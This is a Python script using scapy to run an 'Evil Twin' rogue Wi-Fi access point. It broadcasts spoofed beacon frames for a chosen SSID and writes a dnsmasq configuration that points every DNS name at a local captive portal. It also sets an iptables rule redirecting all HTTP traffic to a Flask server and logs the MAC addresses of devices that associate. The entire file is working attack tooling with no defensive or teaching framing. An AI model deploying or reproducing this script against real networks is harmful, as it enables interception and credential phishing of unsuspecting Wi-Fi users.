from threading import Thread
from scapy.all import *
import time
import os
import sys
import signal

if len(sys.argv) != 3:
    print("Usage: python3 beacon_spoofer.py <SSID> <interface>")
    exit(1)

ssid = sys.argv[1]
iface = sys.argv[2]
bssid = "00:11:22:33:44:55"  # Static fake MAC address
CAPTIVEPORTAL_IP = "192.168.24.1"


def generate_dnsmasq_conf(interface, captive_ip, dhcp_start="192.168.24.50", dhcp_end="192.168.24.250", netmask="255.255.255.0"):
    conf_text = (
        f"bogus-priv\n"
        f"server=/localnet/{captive_ip}\n"
        f"local=/localnet/\n"
        f"interface={interface}\n"
        f"domain=localnet\n"
        f"dhcp-range={dhcp_start},{dhcp_end},2h\n"
        f"address=/#/{captive_ip}\n"
        f"dhcp-option=1,{netmask}\n"
        f"dhcp-option=3,{captive_ip}\n"
        f"dhcp-option=6,{captive_ip}\n"
        f"dhcp-authoritative\n"
    )

    with open("dnsmasq.conf", "w") as conf_file:
        conf_file.write(conf_text)

    print("[+] dnsmasq.conf created successfully.")

def setup_interface_ip(interface, captive_ip, netmask="255.255.255.0"):
    import os
    os.system(f"sudo ifconfig {interface} {captive_ip} netmask {netmask} up")
    print(f"[+] Set {interface} IP to {captive_ip} with netmask {netmask}")

def start_dnsmasq(config_file="dnsmasq.conf"):
    import subprocess
    subprocess.Popen(["sudo", "dnsmasq", "-C", config_file])
    print("[+] dnsmasq started using configuration file:", config_file)

def setup_iptables(redirect_port=8080):
    import os
    os.system(f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {redirect_port}")
    print(f"[+] iptables rule set: redirect all HTTP traffic to port {redirect_port}")

def start_server(script_path="web_server/server.py"):
    import subprocess
    subprocess.Popen(["sudo", "python3", script_path])
    print(f"[+] Flask server started using {script_path}")

generate_dnsmasq_conf(iface, CAPTIVEPORTAL_IP)
setup_interface_ip(iface, CAPTIVEPORTAL_IP)
start_dnsmasq()
setup_iptables(redirect_port=8080)
start_server(script_path="server.py")

# Create 802.11 beacon frame
dot11 = Dot11(type=0, subtype=8,
              addr1="ff:ff:ff:ff:ff:ff",
              addr2=bssid,
              addr3=bssid)
beacon = Dot11Beacon(cap="ESS")
essid = Dot11Elt(ID="SSID", info=ssid)
rsn = Dot11Elt(ID=48, info=(
    '\x01\x00'              # RSN Version
    '\x00\x0f\xac\x02'      # Group Cipher Suite : 00-0f-ac TKIP
    '\x02\x00'              # Pairwise Cipher Suite Count
    '\x00\x0f\xac\x04'      # Pairwise Cipher Suite List : CCMP
    '\x00\x0f\xac\x02'      # AKM Suite List : PSK
    '\x00\x00'))            # RSN Capabilities

frame = RadioTap()/dot11/beacon/essid/rsn

print(f"[+] Spoofing SSID: {ssid} on {iface}...")

# Association detection logic
def detect_associations(iface):
    seen = set()
    def handler(pkt):
        if pkt.haslayer(Dot11):
            client_mac = pkt.addr2
            if not client_mac or client_mac in seen:
                return
            if pkt.haslayer(Dot11Auth) or pkt.haslayer(Dot11AssoReq) or pkt.type == 2:
                seen.add(client_mac)
                print(f"[+] Device ASSOCIATED with Evil Twin: {client_mac}")

    print(f"[*] Listening for client associations on {iface}...")
    sniff(iface=iface, prn=handler, store=0)

# Launch association detection thread
assoc_thread = Thread(target=detect_associations, args=(iface,))
assoc_thread.daemon = True
assoc_thread.start()

stop = False

def handle_sigterm(signum, frame):
    global stop
    stop = True
    print("\n[!] Beacon spoofing stopped.")

signal.signal(signal.SIGTERM, handle_sigterm)

while not stop:
    try:
        sendp(frame, iface=iface, inter=0.1, loop=0, verbose=0)
        if stop:
            break  # Exit the loop immediately if stop is set
        time.sleep(0.1)  # Allow SIGTERM to be processed during sleep
    except Exception as e:
        print(f"[!] Error while sending beacon: {e}")
        break